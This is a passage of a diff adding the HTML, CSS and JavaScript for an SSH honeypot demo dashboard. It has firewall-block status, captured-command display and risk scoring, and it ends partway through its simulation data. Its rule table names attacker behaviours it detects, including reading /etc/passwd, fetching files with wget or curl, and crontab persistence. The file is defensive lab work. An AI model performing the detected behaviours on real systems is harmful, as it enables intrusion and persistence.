@@ -1,0 +1,914 @@
+<!doctype html><html><head><meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><style>:root{color-scheme:light;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{scroll-padding-top:env(safe-area-inset-top,0px)}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#fff;color:#000}img{max-width:100%}[hidden]:not([hidden=until-found i]){display:none!important}</style></head><body>
+<title>Honeycomb Control Panel</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500;600&display=swap">
+<style>
+/* Layout: a single-column operations console. Header → guided demo rail → live topology → actions → analysis → log → raw output.
+   Deliberately dark-only (projector friendly). Semantic colors are fixed: green = safe/success, red = danger/fail,
+   yellow = warning (attacker got in), blue = information. Violet is the attacker's identity color, honey is the brand mark only. */
+:root{
+  color-scheme: dark;
+  --bg:#0a0f16; --bg-2:#0d141d; --panel:#111a25; --panel-2:#162130; --line:#22303f; --line-2:#2e3f52;
+  --text:#e7eef6; --muted:#8c9db1; --dim:#5d6e82;
+  --ok:#36d399; --bad:#ff5c62; --warn:#ffc53d; --info:#5aa9ff; --attacker:#b18cff; --honey:#e9a23b;
+  --ok-bg:rgba(54,211,153,.12); --bad-bg:rgba(255,92,98,.13); --warn-bg:rgba(255,197,61,.12); --info-bg:rgba(90,169,255,.12); --att-bg:rgba(177,140,255,.13);
+  --f-display:"Chakra Petch", "Rajdhani", "Segoe UI", system-ui, sans-serif;
+  --f-body:"IBM Plex Sans", "Segoe UI", system-ui, -apple-system, sans-serif;
+  --f-mono:"IBM Plex Mono", ui-monospace, "SFMono-Regular", Menlo, Consolas, monospace;
+  --r:14px;
+}
+*{box-sizing:border-box}
+html{background:var(--bg)}
+body{background:var(--bg);color:var(--text);font-family:var(--f-body);font-size:15px;line-height:1.5;
+  background-image:radial-gradient(1200px 500px at 15% -10%, rgba(90,169,255,.07), transparent 60%),
+                   radial-gradient(900px 400px at 100% 0%, rgba(177,140,255,.06), transparent 60%);
+  background-attachment:fixed}
+.wrap{max-width:1240px;margin:0 auto;padding-block:28px 64px;
+  padding-left:max(16px, env(safe-area-inset-left, 0px));padding-right:max(16px, env(safe-area-inset-right, 0px));
+  display:grid;gap:28px}
+h1,h2,h3{font-family:var(--f-display);margin:0;text-wrap:balance;letter-spacing:.01em}
+.mono{font-family:var(--f-mono)}
+.num{font-variant-numeric:tabular-nums}
+button{font:inherit;color:inherit;cursor:pointer}
+button:focus-visible,a:focus-visible{outline:2px solid var(--info);outline-offset:2px}
+
+/* ---------- Header ---------- */
+.top{display:flex;flex-wrap:wrap;align-items:center;gap:18px 24px;justify-content:space-between}
+.brand{display:flex;align-items:center;gap:16px;min-width:0}
+.brand svg{flex:none}
+.brand h1{font-size:clamp(24px,3.2vw,34px);font-weight:700;line-height:1.1}
+.brand h1 span{color:var(--honey)}
+.brand p{margin:4px 0 0;color:var(--muted);font-size:14px}
+.brand p b{color:var(--text);font-family:var(--f-mono);font-weight:500}
+.top-meta{display:flex;flex-wrap:wrap;gap:10px;align-items:center}
+.pill{display:inline-flex;align-items:center;gap:8px;padding:6px 12px;border-radius:999px;border:1px solid var(--line-2);
+  background:var(--panel);font-size:13px;color:var(--muted);white-space:nowrap}
+.pill .dot{width:8px;height:8px;border-radius:50%;background:var(--dim)}
+.pill.live .dot{background:var(--ok);box-shadow:0 0 0 0 rgba(54,211,153,.6);animation:ping 2s infinite}
+.pill.live{color:var(--text)}
+.pill.demo .dot{background:var(--info)}
+.pill.demo{color:var(--info);border-color:rgba(90,169,255,.35)}
+.pill.busy .dot{background:var(--warn);animation:ping 1s infinite}
+@keyframes ping{0%{box-shadow:0 0 0 0 rgba(54,211,153,.55)}80%,100%{box-shadow:0 0 0 7px rgba(54,211,153,0)}}
+
+.section-h{display:flex;align-items:baseline;justify-content:space-between;gap:12px;flex-wrap:wrap;margin-bottom:12px}
+.section-h h2{font-size:13px;font-weight:600;letter-spacing:.16em;text-transform:uppercase;color:var(--muted)}
+.section-h .aside{font-size:13px;color:var(--dim)}
+.panel{background:linear-gradient(180deg,var(--panel),var(--bg-2));border:1px solid var(--line);border-radius:var(--r)}
+
+/* ---------- Guided demo rail ---------- */
+.guide{padding:18px 20px;display:grid;gap:16px}
+.guide-head{display:flex;flex-wrap:wrap;gap:14px;align-items:center;justify-content:space-between}
+.guide-now{min-width:0}
+.guide-now .eyebrow{font-size:12px;letter-spacing:.14em;text-transform:uppercase;color:var(--dim)}
+.guide-now h3{font-size:22px;font-weight:600;margin-top:2px}
+.guide-now p{margin:2px 0 0;color:var(--muted)}
+.guide-btns{display:flex;gap:10px;flex-wrap:wrap}
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;border-radius:10px;padding:11px 18px;
+  font-weight:600;border:1px solid transparent;transition:transform .12s ease, filter .12s ease, background .2s ease}
+.btn:hover:not(:disabled){filter:brightness(1.12)}
+.btn:active:not(:disabled){transform:translateY(1px)}
+.btn:disabled{opacity:.45;cursor:not-allowed}
+.btn-primary{background:var(--text);color:#0a0f16}
+.btn-ghost{background:transparent;border-color:var(--line-2);color:var(--muted)}
+.kbd{font-family:var(--f-mono);font-size:11px;padding:1px 6px;border-radius:5px;border:1px solid currentColor;opacity:.6}
+.steps{list-style:none;margin:0;padding:0;display:grid;grid-template-columns:repeat(7,minmax(0,1fr));gap:6px}
+.step{position:relative;padding:10px 10px 10px;border-radius:10px;border:1px solid var(--line);background:var(--bg-2);min-width:0}
+.step .n{font-family:var(--f-display);font-size:13px;color:var(--dim)}
+.step .t{font-size:13px;font-weight:500;color:var(--muted);line-height:1.3;margin-top:2px}
+.step.done{border-color:rgba(54,211,153,.35)}
+.step.done .n{color:var(--ok)}
+.step.done .t{color:var(--text)}
+.step.cur{border-color:var(--text);background:var(--panel-2);box-shadow:0 0 0 3px rgba(231,238,246,.08)}
+.step.cur .n,.step.cur .t{color:var(--text)}
+.step .bar{position:absolute;left:10px;right:10px;bottom:6px;height:2px;border-radius:2px;background:transparent}
+.step.done .bar{background:var(--ok)}
+.step.cur .bar{background:linear-gradient(90deg,var(--text),transparent)}
+@media (max-width:860px){.steps{grid-template-columns:repeat(4,minmax(0,1fr))}}
+@media (max-width:480px){.steps{grid-template-columns:repeat(2,minmax(0,1fr))}}
+
+/* ---------- Topology ---------- */
+.topo{padding:8px 8px 0;overflow-x:auto}
+.topo svg{display:block;width:100%;min-width:680px;height:auto}
+.topo text{font-family:var(--f-body)}
+.lbl-k{font-size:12px;letter-spacing:.14em;fill:var(--dim);text-transform:uppercase}
+.lbl-big{font-family:var(--f-display);font-weight:700;font-size:22px}
+.lbl-sub{font-size:13px;fill:var(--muted)}
+.wire{fill:none;stroke:var(--line-2);stroke-width:2}
+.wire.flow{stroke-dasharray:4 10;animation:dash 1.2s linear infinite}
+.wire.hot{stroke:var(--attacker);opacity:.8}
+.wire.cut{stroke:var(--bad);stroke-dasharray:3 7;opacity:.7}
+@keyframes dash{to{stroke-dashoffset:-28}}
+.node-box{fill:var(--panel-2);stroke:var(--line-2);stroke-width:1.5}
+.fw-ring{transition:stroke .3s ease}
+.stats{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));border-top:1px solid var(--line);margin-top:4px}
+.stat{padding:14px 18px;min-width:0;border-right:1px solid var(--line)}
+.stat:last-child{border-right:0}
+.stat .k{font-size:12px;letter-spacing:.12em;text-transform:uppercase;color:var(--dim)}
+.stat .v{font-family:var(--f-display);font-size:22px;font-weight:600;margin-top:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.stat .s{font-size:13px;color:var(--muted)}
+@media (max-width:760px){.stats{grid-template-columns:repeat(2,minmax(0,1fr))}.stat:nth-child(2){border-right:0}.stat:nth-child(-n+2){border-bottom:1px solid var(--line)}}
+
+/* ---------- Actions ---------- */
+.actions{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:14px}
+@media (max-width:900px){.actions{grid-template-columns:repeat(2,minmax(0,1fr))}}
+@media (max-width:560px){.actions{grid-template-columns:1fr}}
+.act{--c:var(--info);--cbg:var(--info-bg);position:relative;overflow:hidden;padding:16px 16px 14px;display:grid;gap:10px;
+  grid-template-rows:auto 1fr auto;border-radius:var(--r);border:1px solid var(--line);background:var(--panel);transition:border-color .2s}
+.act:hover{border-color:var(--line-2)}
+.act.next{border-color:var(--c);box-shadow:0 0 0 3px var(--cbg)}
+.act-h{display:flex;align-items:center;gap:12px}
+.act-ico{width:38px;height:38px;flex:none;display:grid;place-items:center;border-radius:10px;background:var(--cbg);color:var(--c)}
+.act-h h3{font-size:17px;font-weight:600;line-height:1.2}
+.act-h .sub{font-size:12px;color:var(--dim);font-family:var(--f-mono)}
+.act p{margin:0;color:var(--muted);font-size:14px}
+.act .btn{width:100%;background:var(--cbg);border-color:color-mix(in srgb, var(--c) 45%, transparent);color:var(--c)}
+.act .btn:hover:not(:disabled){background:color-mix(in srgb, var(--c) 22%, transparent);filter:none}
+.act .prog{position:absolute;left:0;bottom:0;height:3px;width:0;background:var(--c);transition:width .25s linear}
+.act.running .btn{color:var(--text)}
+.act .res{font-size:13px;min-height:1.5em;color:var(--dim)}
+.act .res.ok{color:var(--ok)}.act .res.bad{color:var(--bad)}.act .res.warn{color:var(--warn)}.act .res.info{color:var(--info)}
+.c-att{--c:var(--attacker);--cbg:var(--att-bg)}
+.c-info{--c:var(--info);--cbg:var(--info-bg)}
+.c-bad{--c:var(--bad);--cbg:var(--bad-bg)}
+.c-ok{--c:var(--ok);--cbg:var(--ok-bg)}
+.c-warn{--c:var(--warn);--cbg:var(--warn-bg)}
+.spin{width:14px;height:14px;border-radius:50%;border:2px solid currentColor;border-right-color:transparent;animation:spin .7s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* ---------- Analysis ---------- */
+.analysis{display:grid;grid-template-columns:minmax(260px,330px) minmax(0,1fr);gap:0}
+.score{padding:22px 20px;border-right:1px solid var(--line);display:grid;justify-items:center;align-content:center;gap:10px;text-align:center}
+.score svg{width:100%;max-width:280px;height:auto}
+.score .g-num{font-family:var(--f-display);font-weight:700;font-size:64px;fill:var(--text)}
+.score .g-of{font-size:13px;fill:var(--muted)}
+.score .g-tick{font-family:var(--f-mono);font-size:11px;fill:var(--dim)}
+.verdict{display:inline-flex;align-items:center;gap:8px;font-family:var(--f-display);font-weight:700;font-size:20px;letter-spacing:.06em;
+  padding:8px 16px;border-radius:10px;border:1px solid}
+.verdict.bad{color:var(--bad);background:var(--bad-bg);border-color:rgba(255,92,98,.45)}
+.verdict.ok{color:var(--ok);background:var(--ok-bg);border-color:rgba(54,211,153,.45)}
+.verdict.none{color:var(--dim);border-color:var(--line-2)}
+.score .meta{font-size:13px;color:var(--muted)}
+.evid{padding:18px 22px;display:grid;gap:4px;align-content:start;min-width:0}
+.ev{display:grid;grid-template-columns:minmax(150px,220px) minmax(0,1fr) 56px;gap:6px 16px;align-items:center;padding:12px 0;border-bottom:1px dashed var(--line)}
+.ev:last-of-type{border-bottom:0}
+.ev .name{font-weight:600;font-size:15px}
+.ev .code{font-family:var(--f-mono);font-size:12px;color:var(--dim)}
+.ev .track{height:10px;border-radius:6px;background:var(--bg);border:1px solid var(--line);overflow:hidden}
+.ev .fill{height:100%;width:0;border-radius:6px;background:linear-gradient(90deg,rgba(255,197,61,.85),var(--bad));transition:width .9s cubic-bezier(.2,.8,.2,1)}
+.ev .pts{font-family:var(--f-display);font-weight:700;font-size:20px;text-align:right;color:var(--bad)}
+.ev .rules{grid-column:2 / 4;display:flex;gap:6px;flex-wrap:wrap}
+.chip{font-family:var(--f-mono);font-size:11px;padding:2px 7px;border-radius:6px;background:var(--panel-2);border:1px solid var(--line-2);color:var(--muted)}
+.ev-sum{display:flex;justify-content:space-between;gap:12px;padding-top:12px;margin-top:4px;border-top:1px solid var(--line-2);color:var(--muted);font-size:14px}
+.ev-sum b{font-family:var(--f-display);font-size:18px;color:var(--text)}
+.empty{display:grid;place-items:center;text-align:center;color:var(--dim);padding:40px 20px;gap:6px}
+.empty b{color:var(--muted);font-weight:500}
+@media (max-width:760px){.analysis{grid-template-columns:1fr}.score{border-right:0;border-bottom:1px solid var(--line)}
+  .ev{grid-template-columns:minmax(0,1fr) 48px}.ev .track{grid-column:1 / 3;grid-row:2}.ev .rules{grid-column:1 / 3}}
+
+/* ---------- Log ---------- */
+.log{overflow-x:auto}
+.log table{width:100%;border-collapse:collapse;min-width:620px}
+.log th{text-align:left;font-size:12px;letter-spacing:.12em;text-transform:uppercase;color:var(--dim);font-weight:500;padding:12px 18px;border-bottom:1px solid var(--line)}
+.log td{padding:11px 18px;border-bottom:1px solid var(--line);vertical-align:middle}
+.log tr:last-child td{border-bottom:0}
+.log td.t{font-family:var(--f-mono);font-size:13px;color:var(--muted);white-space:nowrap}
+.log td.d{font-family:var(--f-mono);font-size:13px;color:var(--muted);text-align:right;white-space:nowrap}
+.log td.a{font-weight:500;white-space:nowrap}
+.tag{display:inline-flex;align-items:center;gap:8px}
+.tag::before{content:"";width:8px;height:8px;border-radius:50%;background:currentColor;flex:none}
+.tone-ok{color:var(--ok)}.tone-bad{color:var(--bad)}.tone-warn{color:var(--warn)}.tone-info{color:var(--info)}
+.log tr.new td{animation:flash 1.6s ease}
+@keyframes flash{from{background:rgba(231,238,246,.07)}to{background:transparent}}
+
+/* ---------- Raw output ---------- */
+.term{overflow:hidden}
+.term-h{display:flex;align-items:center;justify-content:space-between;gap:10px;padding:10px 14px;border-bottom:1px solid var(--line);background:var(--bg-2)}
+.term-h .dots{display:flex;gap:6px}
+.term-h .dots i{width:10px;height:10px;border-radius:50%;background:var(--line-2)}
+.term-h .ttl{font-family:var(--f-mono);font-size:12px;color:var(--dim);flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.term-h .btn{padding:5px 10px;font-size:12px}
+.term pre{margin:0;padding:16px 18px;font-family:var(--f-mono);font-size:13px;line-height:1.65;color:#c9d4e1;max-height:340px;overflow:auto;white-space:pre-wrap;word-break:break-word}
+.term .p{color:var(--ok)}.term .c{color:var(--dim)}.term .hl{color:var(--warn)}.term .er{color:var(--bad)}
+
+.foot{display:flex;flex-wrap:wrap;gap:8px 18px;color:var(--dim);font-size:13px;justify-content:space-between}
+.foot code{font-family:var(--f-mono);color:var(--muted)}
+
+/* ---------- Pipeline ---------- */
+.pipe-wrap{overflow-x:auto;border-bottom:1px solid var(--line)}
+.pipe{display:grid;grid-template-columns:repeat(7,minmax(92px,1fr));padding:18px 12px 16px;min-width:660px}
+.ps{position:relative;display:grid;justify-items:center;align-content:start;gap:5px;text-align:center;padding:0 4px}
+.ps::before{content:"";position:absolute;top:17px;left:-50%;right:50%;height:2px;background:var(--line-2);transition:background .25s}
+.ps:first-child::before{display:none}
+.ps .pd{width:36px;height:36px;border-radius:50%;display:grid;place-items:center;border:1.5px solid var(--line-2);background:var(--bg);
+  color:var(--dim);font-family:var(--f-display);font-weight:700;font-size:13px;position:relative;z-index:1;transition:all .25s}
+.ps .nm{font-size:13px;font-weight:600;color:var(--muted)}
+.ps .ds{font-size:12px;color:var(--dim);line-height:1.3}
+.ps.active .pd{border-color:var(--info);color:var(--info);box-shadow:0 0 0 6px var(--info-bg)}
+.ps.active .nm{color:var(--text)}
+.ps.done .pd{border-color:var(--ok);background:var(--ok-bg);color:var(--ok)}
+.ps.done .nm{color:var(--text)}
+.ps.done::before,.ps.active::before{background:var(--ok)}
+.ps.done.danger .pd{border-color:var(--bad);background:var(--bad-bg);color:var(--bad)}
+
+/* ---------- Rule tooltips ---------- */
+.chip[data-tip]{position:relative;cursor:help}
+.chip[data-tip]:hover::after,.chip[data-tip]:focus::after{content:attr(data-tip);position:absolute;bottom:calc(100% + 8px);left:0;width:max-content;max-width:260px;
+  white-space:normal;background:var(--text);color:var(--bg);font-family:var(--f-body);font-size:12.5px;line-height:1.4;padding:7px 10px;border-radius:8px;z-index:5;
+  box-shadow:0 8px 24px rgba(0,0,0,.45)}
+.rule-legend{font-size:12px;color:var(--dim)}
+
+/* ---------- Captured commands ---------- */
+.cap-row{display:grid;grid-template-columns:96px 76px minmax(0,1fr) auto;gap:12px;align-items:center;padding:10px 18px;border-bottom:1px solid var(--line);font-size:14px}
+.cap-row:last-child{border-bottom:0}
+.cap-row .t{font-family:var(--f-mono);font-size:12.5px;color:var(--dim)}
+.cap-row code{font-family:var(--f-mono);color:var(--text);overflow-wrap:anywhere;min-width:0}
+.cap-row code::before{content:"root@svr04:~# ";color:var(--warn);opacity:.75}
+.port{font-family:var(--f-mono);font-size:11.5px;padding:2px 8px;border-radius:6px;border:1px solid var(--line-2);color:var(--muted);text-align:center}
+.kind{font-size:12px;font-weight:600;padding:3px 9px;border-radius:999px;white-space:nowrap}
+.kind.bad{color:var(--bad);background:var(--bad-bg)}.kind.warn{color:var(--warn);background:var(--warn-bg)}.kind.info{color:var(--info);background:var(--info-bg)}
+@media (max-width:560px){.cap-row{grid-template-columns:auto auto minmax(0,1fr)}.cap-row code{grid-column:1 / -1;grid-row:2}}
+
+/* ---------- Finale ---------- */
+.finale{display:grid;grid-template-columns:repeat(5,minmax(0,1fr));gap:10px}
+.fc{padding:14px 14px 12px;border-radius:12px;border:1px solid var(--line-2);background:var(--bg-2);min-width:0;display:grid;gap:2px;align-content:start}
+.fc .k{font-size:11.5px;letter-spacing:.12em;text-transform:uppercase;color:var(--dim)}
+.fc .v{font-family:var(--f-display);font-size:21px;font-weight:700;line-height:1.2;margin-top:4px}
+.fc .s{font-size:13px;color:var(--muted)}
+.fc.ok{border-color:rgba(54,211,153,.4)}.fc.ok .v{color:var(--ok)}
+.fc.bad{border-color:rgba(255,92,98,.4)}.fc.bad .v{color:var(--bad)}
+.fc.warn{border-color:rgba(255,197,61,.4)}.fc.warn .v{color:var(--warn)}
+.fc.info .v{color:var(--info)}
+@media (max-width:900px){.finale{grid-template-columns:repeat(2,minmax(0,1fr))}}
+button.pill{cursor:pointer}
+button.pill:hover{color:var(--text);border-color:var(--muted)}
+
+@media (prefers-reduced-motion: reduce){
+  *,*::before,*::after{animation-duration:.001ms!important;animation-iteration-count:1!important;transition-duration:.001ms!important}
+}
+</style>
+
+<div class="wrap">
+
+  <!-- Header -->
+  <header class="top">
+    <div class="brand">
+      <svg width="52" height="52" viewBox="0 0 52 52" aria-hidden="true">
+        <g fill="none" stroke="#e9a23b" stroke-width="2.2">
+          <path d="M26 4l9.5 5.5v11L26 26l-9.5-5.5v-11z"/>
+          <path d="M16.5 20.5L26 26v11l-9.5 5.5L7 37V26z" opacity=".55"/>
+          <path d="M35.5 20.5L45 26v11l-9.5 5.5L26 37V26z" opacity=".55"/>
+        </g>
+        <circle cx="26" cy="15.5" r="3.2" fill="#e9a23b"/>
+      </svg>
+      <div>
+        <h1>Honey<span>comb</span> Control Panel</h1>
+        <p>SSH honeypot with automatic scoring and a reversible firewall block. Lab attacker <b>10.77.0.2</b> is a scripted machine inside the lab.</p>
+      </div>
+    </div>
+    <div class="top-meta">
+      <span class="pill" id="modePill"><span class="dot"></span><span id="modeTxt">Connecting…</span></span>
+      <span class="pill num" id="refreshPill"><span class="dot" style="background:var(--dim)"></span><span id="refreshTxt">Status every 4 s</span></span>
+      <button class="pill" id="fsBtn" type="button">Full screen <span class="kbd">F</span></button>
+    </div>
+  </header>
+
+  <!-- Guided demo -->
+  <section aria-labelledby="g-h">
+    <div class="section-h"><h2 id="g-h">Guided demo</h2><span class="aside">Press <span class="kbd">N</span> for the next step, <span class="kbd">1</span>–<span class="kbd">6</span> for any action</span></div>
+    <div class="panel guide">
+      <div class="guide-head">
+        <div class="guide-now">
+          <div class="eyebrow" id="gEyebrow">Step 1 of 7</div>
+          <h3 id="gTitle">Attack the protected port</h3>
+          <p id="gCaption">The attacker logs in to port 2222 and runs commands.</p>
+        </div>
+        <div class="guide-btns">
+          <button class="btn btn-ghost" id="gReset" type="button">Restart</button>
+          <button class="btn btn-primary" id="gNext" type="button">Run step 1 <span class="kbd">N</span></button>
+        </div>
+      </div>
+      <ol class="steps" id="steps"></ol>
+      <div class="finale" id="finale" hidden></div>
+    </div>
+  </section>
+
+  <!-- Live status -->
+  <section aria-labelledby="s-h">
+    <div class="section-h"><h2 id="s-h">Live status</h2><span class="aside" id="lastRefresh">Waiting for first refresh</span></div>
+    <div class="panel">
+      <div class="topo">
+        <svg viewBox="0 0 1000 300" role="img" aria-label="Attacker, firewall and the two honeypot ports">
+          <defs>
+            <radialGradient id="glowAtt"><stop offset="0" stop-color="#b18cff" stop-opacity=".35"/><stop offset="1" stop-color="#b18cff" stop-opacity="0"/></radialGradient>
+            <radialGradient id="glowFw"><stop offset="0" id="fwGlowStop" stop-color="#36d399" stop-opacity=".25"/><stop offset="1" stop-color="#36d399" stop-opacity="0"/></radialGradient>
+          </defs>
+
+          <!-- wires -->
+          <path id="w1" class="wire flow" d="M 205 150 L 420 150"/>
+          <path id="w2" class="wire flow" d="M 580 150 C 650 150 650 82 720 82"/>
+          <path id="w3" class="wire flow" d="M 580 150 C 650 150 650 218 720 218"/>
+          <g id="packets"></g>
+
+          <!-- attacker -->
+          <circle cx="120" cy="150" r="95" fill="url(#glowAtt)"/>
+          <g transform="translate(120 150)">
+            <circle r="58" fill="#162130" stroke="#b18cff" stroke-width="2"/>
+            <g fill="none" stroke="#b18cff" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" transform="translate(-16 -26)">
+              <rect x="0" y="0" width="32" height="22" rx="3"/><path d="M7 8l5 4-5 4M15 16h8"/><path d="M10 28h12"/>
+            </g>
+            <text y="22" text-anchor="middle" class="lbl-sub" style="fill:#b18cff;font-family:var(--f-mono);font-size:13px">10.77.0.2</text>
+          </g>
+          <text x="120" y="244" text-anchor="middle" class="lbl-k">Attacker</text>
+          <text x="120" y="264" text-anchor="middle" class="lbl-sub">Scripted lab machine</text>
+
+          <!-- firewall -->
+          <circle cx="500" cy="150" r="110" fill="url(#glowFw)"/>
+          <g transform="translate(500 150)">
+            <path id="fwShield" class="fw-ring" d="M0 -66 L58 -44 L58 6 C58 40 30 60 0 72 C-30 60 -58 40 -58 6 L-58 -44 Z" fill="#162130" stroke="#36d399" stroke-width="2.5"/>
+            <g id="fwIcon" fill="none" stroke="#36d399" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M-14 -4 l9 9 l19 -20"/>
+            </g>
+            <text id="fwState" y="34" text-anchor="middle" style="font-family:var(--f-display);font-weight:700;font-size:15px;fill:#36d399;letter-spacing:.06em">OPEN</text>
+          </g>
+          <text x="500" y="244" text-anchor="middle" class="lbl-k">Firewall</text>
+          <text x="500" y="264" text-anchor="middle" class="lbl-sub" id="fwSub">No rule for 10.77.0.2</text>
+
+          <!-- port 2222 -->
+          <g transform="translate(720 38)">
+            <rect class="node-box" id="p1Box" width="250" height="88" rx="12"/>
+            <rect id="p1Stripe" x="0" y="0" width="5" height="88" rx="2" fill="#36d399"/>
+            <text x="22" y="26" class="lbl-k">Port 2222 · protected</text>
+            <text x="22" y="56" class="lbl-big" id="p1State" fill="#36d399">ACCEPTING</text>
+            <text x="22" y="76" class="lbl-sub" id="p1Sub">Stands for the real service</text>
+          </g>
+          <!-- port 2223 -->
+          <g transform="translate(720 174)">
+            <rect class="node-box" width="250" height="88" rx="12"/>
+            <rect x="0" y="0" width="5" height="88" rx="2" fill="#ffc53d"/>
+            <text x="22" y="26" class="lbl-k">Port 2223 · open trap</text>
+            <text x="22" y="56" class="lbl-big" fill="#ffc53d">ALWAYS OPEN</text>
+            <text x="22" y="76" class="lbl-sub">Never blocked, keeps recording</text>
+          </g>
+        </svg>
+      </div>
+      <div class="stats">
+        <div class="stat"><div class="k">Block list</div><div class="v" id="stBlock" style="color:var(--ok)">Not blocked</div><div class="s" id="stBlockS">No entry for 10.77.0.2</div></div>
+        <div class="stat"><div class="k">Packets dropped</div><div class="v num" id="stDrops">0</div><div class="s">Firewall counter on 2222</div></div>
+        <div class="stat"><div class="k">Block expires</div><div class="v num" id="stExp">—</div><div class="s" id="stExpS">Nothing to expire</div></div>
+        <div class="stat"><div class="k">Last attack</div><div class="v" id="stLast">None yet</div><div class="s" id="stLastS">Run step 1 to start</div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Actions -->
+  <section aria-labelledby="a-h">
+    <div class="section-h"><h2 id="a-h">Actions</h2><span class="aside">One action runs at a time</span></div>
+    <div class="actions" id="actions"></div>
+  </section>
+
+  <!-- Captured commands -->
+  <section aria-labelledby="c-h">
+    <div class="section-h"><h2 id="c-h">Captured by the trap</h2><span class="aside num" id="capCount">Commands the attacker typed inside the fake shell</span></div>
+    <div class="panel" id="capList"><div class="empty"><b>Nothing captured yet</b>Run an attack and every command the attacker types appears here.</div></div>
+  </section>
+
+  <!-- Analysis -->
+  <section aria-labelledby="an-h">
+    <div class="section-h"><h2 id="an-h">Attack analysis</h2><span class="aside" id="anAside">Scored from the captured honeypot log</span></div>
+    <div class="panel">
+    <div class="pipe-wrap"><div class="pipe" id="pipe"></div></div>
+    <div class="analysis">
+      <div class="score">
+        <svg viewBox="0 0 240 150" aria-label="Risk score gauge">
+          <defs>
+            <linearGradient id="gGrad" x1="0" x2="1">
+              <stop offset="0" stop-color="#36d399"/><stop offset=".5" stop-color="#ffc53d"/><stop offset="1" stop-color="#ff5c62"/>
+            </linearGradient>
+          </defs>
+          <path d="M 25 125 A 95 95 0 0 1 215 125" fill="none" stroke="#22303f" stroke-width="16" stroke-linecap="round"/>
+          <path id="gArc" d="M 25 125 A 95 95 0 0 1 215 125" fill="none" stroke="url(#gGrad)" stroke-width="16" stroke-linecap="round" pathLength="100" stroke-dasharray="0 100"/>
+          <g id="gNeedle" transform="rotate(-90 120 125)"><line x1="120" y1="44" x2="120" y2="16" stroke="#e7eef6" stroke-width="4" stroke-linecap="round"/></g>
+          <g id="gThresh" hidden><line x1="120" y1="20" x2="120" y2="42" stroke="#e7eef6" stroke-width="2" stroke-dasharray="3 3"/></g>
+          <text x="18" y="146" class="g-tick">0</text><text x="214" y="146" class="g-tick">100</text>
+          <text x="120" y="112" text-anchor="middle" class="g-num num" id="gNum">–</text>
+        </svg>
+        <div class="verdict none" id="verdict">NOT SCORED</div>
+        <div class="meta" id="scoreMeta">Risk score out of 100</div>
+      </div>
+      <div class="evid" id="evid">
+        <div class="empty"><b>No analysis yet</b>Run <span class="kbd">2</span> Analyze attack to score the captured log.</div>
+      </div>
+    </div>
+    </div>
+  </section>
+
+  <!-- Log -->
+  <section aria-labelledby="l-h">
+    <div class="section-h"><h2 id="l-h">Activity log</h2><span class="aside num" id="logCount">0 actions</span></div>
+    <div class="panel log">
+      <table>
+        <thead><tr><th>Time</th><th>Action</th><th>Result</th><th style="text-align:right">Took</th></tr></thead>
+        <tbody id="logBody"><tr><td colspan="4" style="color:var(--dim);text-align:center;padding:26px">Every button you press is recorded here.</td></tr></tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- Raw output -->
+  <section aria-labelledby="r-h">
+    <div class="section-h"><h2 id="r-h">Raw output</h2><span class="aside">The exact command and what it returned</span></div>
+    <div class="panel term">
+      <div class="term-h"><span class="dots"><i></i><i></i><i></i></span><span class="ttl" id="rawTitle">kali@honeycomb: ~/honeycomb-test</span><button class="btn btn-ghost" id="copyRaw" type="button">Copy</button></div>
+      <pre id="raw"><span class="c"># Output of the last action appears here.</span></pre>
+    </div>
+  </section>
+
+  <footer class="foot">
+    <span>Listens on <code>127.0.0.1:8088</code> only · locked to <code>10.77.0.2</code> · rejects cross-site requests</span>
+    <span id="footMode"></span>
+  </footer>
+</div>
+
+<script>
+/* =====================================================================
+   1. Server adapter.  Everything that talks to demo_gui.py lives here.
+   If the server is not reachable (for example this preview), the page
+   runs a local simulation so every screen can be shown.
+   ===================================================================== */
+const LAB_IP = "10.77.0.2";
+/* Score at which the pipeline says BLOCK_CANDIDATE. Set it to the real number
+   from the scoring code (for example 60) to draw the line on the gauge; null hides it. */
+const BLOCK_THRESHOLD = null;
+/* What each behaviour rule means. Shown when hovering a rule chip. Edit to match the rule file. */
+const RULES = {
+  B02:"Logged in successfully with a guessed password",
+  B04:"Ran system reconnaissance (uname, id, whoami …)",
+  B05:"Read account or system files such as /etc/passwd",
+  B08:"Downloaded a file from outside (wget / curl)",
+  B10:"Tried to schedule a job with crontab",
+  B11:"Tried to keep access after a reboot or logout"
+};
+const SERVER = {
+  status: "/api/status",            // GET  -> live status
+  action: (id) => "/api/" + id      // POST -> run one action
+};
+let LIVE = false;
+
+async function serverGet(url){
+  const r = await fetch(url, {cache:"no-store"});
+  if(!r.ok) throw new Error("HTTP " + r.status);
+  return r.json();
+}
+async function serverPost(url){
+  const r = await fetch(url, {method:"POST", headers:{"Content-Type":"application/json"}, body:"{}"});
+  if(!r.ok) throw new Error("HTTP " + r.status);
+  return r.json();
+}
+
+/* Normalized shapes the UI uses:
+   status: {blocked:bool, drops:int, expiresAt:ms|null}
+   result: {tone:'ok'|'bad'|'warn'|'info', summary, command, output, analysis?, status?} */
+
+/* ---------- 2. Local simulation (preview / no server) ---------- */
+const SIM = {blocked:false, drops:0, expiresAt:null, attacked:false};
+const SIM_ANALYSIS = {
+  score:70, decision:"BLOCK_CANDIDATE",
+  evidence:[
+    {name:"login_success", label:"Login succeeded", points:20, rules:["B02"]},
+    {name:"recon_commands", label:"Reconnaissance commands", points:10, rules:["B04","B05"]},
